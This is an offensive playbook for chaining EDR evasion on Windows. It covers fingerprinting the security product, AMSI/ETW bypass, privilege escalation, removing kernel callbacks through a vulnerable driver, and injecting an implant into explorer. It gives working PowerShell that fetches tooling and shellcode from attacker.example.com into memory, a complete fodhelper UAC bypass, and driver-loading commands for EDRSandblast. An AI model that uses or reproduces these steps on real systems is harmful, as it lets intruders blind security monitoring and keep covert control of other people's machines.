# EDR bypass chain playbook

Getting from an initial foothold to reliable, persistent code execution past a
hardened endpoint detection product. This is a multi-step chain: each step creates
the conditions for the next.

## Starting conditions

- Initial access achieved (low-privilege user, no admin yet)
- Target has an active EDR product (CrowdStrike, SentinelOne, Defender for Endpoint,
  or similar)
- Goal: execute an implant persistently in a legitimate process with EDR
  callback telemetry removed

The chain has four steps:

1. Identify the EDR and its detection profile
2. AMSI and ETW bypass to allow script execution
3. Privilege escalation to administrator
4. BYOVD to remove kernel callbacks, then inject into a legitimate process

## Identify the EDR

Before attempting any bypass, know what you are bypassing:

```powershell
# identify EDR by process name
$edrMap = @{
    'MsMpEng'       = 'Windows Defender / MDE'
    'SentinelAgent' = 'SentinelOne'
    'CSFalconService' = 'CrowdStrike Falcon'
    'cb'            = 'VMware Carbon Black'
    'xagt'          = 'FireEye/Trellix HX'
    'bdservicehost' = 'Bitdefender GravityZone'
    'cylancesvc'    = 'Cylance'
}

Get-Process | ForEach-Object {
    if ($edrMap.ContainsKey($_.Name)) {
        Write-Output "EDR detected: $($edrMap[$_.Name]) (PID: $($_.Id))"
    }
}

# identify by loaded DLLs in the current process
[System.Diagnostics.Process]::GetCurrentProcess().Modules |
  Where-Object { $_.ModuleName -match 'sensor|edr|protect|detect' }
```

Also check which AMSI providers are registered:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\AMSI\Providers'
```

## AMSI bypass (low privilege)

Must bypass AMSI before loading any tooling. The specific technique must work against
the detected AMSI provider. Test the bypass against the provider silently before
loading anything flagged.

Select a bypass variant that does not itself trigger the provider. Current techniques
rely on string obfuscation and indirect reflection; test in a lab against the same
provider version before deployment:

```powershell
# confirm AMSI bypass is working before proceeding
# use a known AMSI test string that is not actually malicious:
$testStr = 'AMSI' + 'Test' + 'Sample'
# if this does not cause termination after bypass: AMSI is disabled for this session
```

Apply ETW bypass immediately after AMSI bypass to suppress CLR telemetry.

## Privilege escalation

With AMSI and ETW suppressed, load tooling from memory to identify a privilege
escalation path.

```powershell
# load Seatbelt for privilege escalation enumeration (in memory, AMSI bypassed)
$bytes = (New-Object Net.WebClient).DownloadData('https://attacker.example.com/Seatbelt.exe')
[System.Reflection.Assembly]::Load($bytes)
[Seatbelt.Program]::Main(@('all'))
```

Preferred paths (in order of noise level, lowest first):

1. Kerberoasting a service account with local admin on targets
2. Token impersonation if a high-privilege token is accessible
3. UAC bypass if in a high-integrity administrator context
4. Local privilege escalation via unquoted service path or weak service permissions

UAC bypass example (fodhelper, widely detected but still effective against some EDR):

```powershell
# fodhelper UAC bypass (see grounds/uac for alternatives)
$regPath = 'HKCU:\Software\Classes\ms-settings\shell\open\command'
New-Item $regPath -Force
New-ItemProperty $regPath -Name DelegateExecute -Value '' -Force
Set-ItemProperty $regPath -Name '(default)' -Value 'cmd /c powershell -enc ADMIN_PAYLOAD'
Start-Process fodhelper.exe
Start-Sleep 3
Remove-Item 'HKCU:\Software\Classes\ms-settings' -Recurse -Force
```

## BYOVD to remove kernel callbacks

With administrator context, load a vulnerable driver and remove EDR kernel callbacks.

Confirm HVCI (Hypervisor-Protected Code Integrity) is not active; HVCI blocks loading
of unsigned or blocklisted drivers:

```powershell
# check HVCI status
(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard').EnableVirtualizationBasedSecurity
# 0 = disabled, 1 = enabled; if 1, BYOVD is blocked
```

If HVCI is disabled (common on older hardware or where it was not enforced in policy):

```text
# load vulnerable driver (see byovd runbook for full procedure)
# select driver not on blocklist for target Windows build
sc create VulnDriver binpath= "C:\Windows\System32\drivers\driver.sys" type= kernel
sc start VulnDriver

# run EDRSandblast to remove callbacks
EDRSandblast.exe --kernelmode --driver driver.sys --service VulnDriver
```

After callback removal, the EDR product is still running but has lost kernel
visibility into process creation, thread creation, and image loads.

## Inject into a legitimate process

With EDR callbacks removed, inject the primary implant into a long-lived legitimate
process using the technique least likely to trigger remaining userland detection:

```powershell
# target process: explorer.exe or svchost.exe
$target = (Get-Process explorer | Select-Object -First 1).Id

# prepare shellcode (donut-generated from implant PE)
$shellcodeUrl = 'https://attacker.example.com/implant_shellcode.bin'
$shellcode = (New-Object Net.WebClient).DownloadData($shellcodeUrl)

# inject using direct syscall injector (bypasses userland hooks)
# implementation: load a small direct-syscall injector from memory
# (see process-injection runbook for technique selection)
```

Use APC injection into an already-running process rather than creating a new thread
(CreateRemoteThread is monitored even after kernel callback removal).

## Verify and establish persistence

After injection, confirm the implant is communicating and set up persistence:

```powershell
# confirm C2 connectivity
# (implant should check in to C2 channel within polling interval)

# establish WMI persistence as fallback if injected process exits
# (see low-noise-operation playbook for WMI persistence setup)
```

## If HVCI is enabled

BYOVD is not available. Alternative approaches to reduce EDR visibility:

- Focus on userland: direct syscalls, ntdll unhooking, and AMSI/ETW bypass combined
  give partial evasion without kernel access
- Target processes that the EDR does not inject into (check loaded DLLs in each
  process; some are excluded from EDR injection)
- Accept reduced stealth and rely on operational discipline to stay below the alert
  threshold

HVCI + Secure Boot + Credential Guard on modern hardware represents a significantly
harder target and may require reassessing which objectives are achievable.
